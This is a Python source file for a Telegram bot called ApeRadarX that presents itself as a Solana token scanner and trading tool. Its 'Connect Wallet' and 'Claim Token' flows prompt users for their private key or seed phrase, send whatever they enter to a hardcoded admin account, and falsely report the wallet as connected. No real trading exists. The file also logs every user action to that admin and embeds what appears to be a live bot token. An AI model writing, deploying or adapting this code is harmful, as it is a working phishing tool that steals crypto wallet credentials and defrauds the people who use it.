"""
Simple Solana Telegram Bot — Updated
-------------------------------------
Replace BOT_TOKEN with your token from @BotFather then run:
  py solana_bot.py
"""

import os
import re
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ──────────────────────────────────────────────
# 🔑 Bot Token from Railway environment variable
# ──────────────────────────────────────────────
import os
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8706539484:AAHoqm4ogkKQG3Y6-xzrXHwOrs09s0dZPlY")

# ──────────────────────────────────────────────
# Bot name
# ──────────────────────────────────────────────
BOT_NAME = "ApeRadarX"

# ──────────────────────────────────────────────
# Admin Telegram ID
# ──────────────────────────────────────────────
ADMIN_ID = 1495066761

# Track which users are in "wallet connect" mode
waiting_for_wallet = {}


# ──────────────────────────────────────────────
# Helper: notify admin of any activity
# ──────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 Message: `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ──────────────────────────────────────────────
# Main menu
# ──────────────────────────────────────────────
def main_menu_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
            InlineKeyboardButton("🔴 Sell", callback_data="sell_menu"),
        ],
        [
            InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
            InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token"),
        ],
        [
            InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )


# ──────────────────────────────────────────────
# Token helpers
# ──────────────────────────────────────────────
def get_token_info(contract_address: str):
    url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        pairs = data.get("pairs")
        if not pairs:
            return None
        pair = sorted(
            pairs,
            key=lambda p: float(p.get("liquidity", {}).get("usd", 0) or 0),
            reverse=True,
        )[0]
        return pair
    except Exception:
        return None


def format_number(n) -> str:
    try:
        n = float(n)
        if n >= 1_000_000_000:
            return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000:
            return f"${n/1_000_000:.2f}M"
        if n >= 1_000:
            return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except Exception:
        return "N/A"


def build_token_message(pair: dict) -> str:
    base = pair.get("baseToken", {})
    name = base.get("name", "Unknown")
    symbol = base.get("symbol", "???")
    price_usd = pair.get("priceUsd", "N/A")
    price_change = pair.get("priceChange", {})
    h1 = price_change.get("h1", "N/A")
    h24 = price_change.get("h24", "N/A")
    volume_24h = pair.get("volume", {}).get("h24", "N/A")
    liquidity = pair.get("liquidity", {}).get("usd", "N/A")
    market_cap = pair.get("marketCap", "N/A")
    dex = pair.get("dexId", "N/A").upper()
    url = pair.get("url", "")

    def sign(val):
        try:
            return "🟢 +" if float(val) >= 0 else "🔴 "
        except Exception:
            return ""

    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url:
        msg += f"\n[📎 View on DexScreener]({url})"
    return msg


def token_keyboard(symbol, address):
    keyboard = [
        [
            InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
            InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}"),
        ],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ]
    return InlineKeyboardMarkup(keyboard)


def is_valid_seed_or_key(text: str) -> bool:
    """Check if text looks like a seed phrase (12/24 words) or private key (base58, 87-88 chars)."""
    words = text.strip().split()
    if len(words) in (12, 24):
        return True
    # Solana private key is base58, typically 87-88 chars
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()):
        return True
    return False


# ──────────────────────────────────────────────
# /start
# ──────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(
        main_menu_text(),
        parse_mode="MarkdownV2",
        reply_markup=main_menu_keyboard(),
    )


# ──────────────────────────────────────────────
# /help
# ──────────────────────────────────────────────
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    await notify_admin(context, user, "❓ Clicked /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste any Solana token contract address to scan it\n"
        "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
        "👛 Connect Wallet to enable real trading\n"
        "🎁 Claim Token for airdrops & rewards\n"
        "👥 Referrals to invite friends\n"
        "🔄 Refresh to update your balance\n\n"
        "/start — Back to main menu",
        parse_mode="Markdown",
    )


# ──────────────────────────────────────────────
# Button handler
# ──────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # Notify admin of every button click
    await notify_admin(context, user, f"🔘 Clicked button: `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        await query.message.reply_text(
            main_menu_text(),
            parse_mode="MarkdownV2",
            reply_markup=main_menu_keyboard(),
        )

    elif data == "buy_menu":
        await query.message.reply_text(
            "🟢 *Buy Token*\n\n"
            "Paste the token contract address you want to buy and I'll pull up the info with a Buy button!",
            parse_mode="Markdown",
        )

    elif data == "sell_menu":
        await query.message.reply_text(
            "🔴 *Sell Token*\n\n"
            "Paste the token contract address you want to sell and I'll pull up the info with a Sell button!",
            parse_mode="Markdown",
        )

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\n"
            "To connect your Solana wallet, import your private key or seed phrase.\n\n"
            "⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown",
        )

    elif data == "claim_token":
        await query.message.reply_text(
            "🎁 *Claim Token*\n\n"
            "Click the *CONNECT WALLET* button to generate or connect your wallet and get started.",
            parse_mode="Markdown",
        )

    elif data == "referrals":
        ref_link = f"https://t.me/YourBotUsername?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\n"
            f"Invite friends and earn rewards when they trade!\n\n"
            f"🔗 Your referral link:\n`{ref_link}`\n\n"
            f"Share this link with friends to earn bonuses!",
            parse_mode="Markdown",
        )

    elif data == "help":
        await query.message.reply_text(
            f"❓ *{BOT_NAME} Help*\n\n"
            "🔍 Paste any Solana token contract address to scan it\n"
            "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
            "👛 Connect Wallet to enable real trading\n"
            "🎁 Claim Token for airdrops & rewards\n"
            "👥 Referrals to invite friends\n"
            "🔄 Refresh to update your balance\n\n"
            "/start — Back to main menu",
            parse_mode="Markdown",
        )

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(
            f"🟢 *Buy {symbol}*\n\n"
            "Enter the amount of SOL you want to spend:\n\n"
            "⚠️ _Connect your wallet first to make real trades._",
            parse_mode="Markdown",
        )

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(
            f"🔴 *Sell {symbol}*\n\n"
            "Enter the amount of tokens you want to sell:\n\n"
            "⚠️ _Connect your wallet first to make real trades._",
            parse_mode="Markdown",
        )

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await query.message.edit_text(
                build_token_message(pair),
                parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True,
            )
        else:
            await query.message.reply_text("⚠️ Could not refresh token data.")


# ──────────────────────────────────────────────
# Handle all text messages
# ──────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.message.from_user

    # If user is in wallet connect mode
    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            # Notify admin with what they sent
            await notify_admin(context, user, "👛 Submitted wallet credentials", text)
            waiting_for_wallet[user.id] = False
            await update.message.reply_text(
                "✅ *Wallet connected successfully!*\n\n"
                "Your wallet has been linked. You can now buy and sell tokens.",
                parse_mode="Markdown",
            )
        else:
            # Notify admin of invalid attempt
            await notify_admin(context, user, "❌ Invalid wallet input attempt", text)
            await update.message.reply_text(
                "⚠️ Invalid seed phrase. Check your words and try again.",
            )
        return

    # Token address lookup
    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await notify_admin(context, user, f"🔍 Scanned token: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair),
                parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True,
            )
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text(
                "❌ Token not found on DexScreener.\n\n"
                "Make sure you pasted a valid Solana token contract address."
            )
    else:
        # Any other message — notify admin
        await notify_admin(context, user, "💬 Sent a message", text)
        await update.message.reply_text(
            "👋 Paste a Solana token contract address to scan it!\n"
            "Or tap /start for the main menu."
        )


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 Bot is starting...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("✅ Bot is running! Press Ctrl+C to stop.")
    app.run_polling()
